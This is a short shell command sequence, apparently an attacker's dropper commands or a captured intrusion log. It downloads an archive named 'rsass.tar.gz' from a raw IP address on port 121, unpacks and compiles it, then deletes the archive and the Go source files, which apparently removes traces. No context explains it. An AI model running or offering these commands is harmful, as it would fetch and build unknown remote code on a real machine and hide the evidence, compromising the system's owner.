wget http://188.227.84.204:121/linux/rsass.tar.gz
gunzip rsass.tar.gz && tar -xvf rsass.tar && rm rsass.tar
cd rsass && make && rm -r file *.go
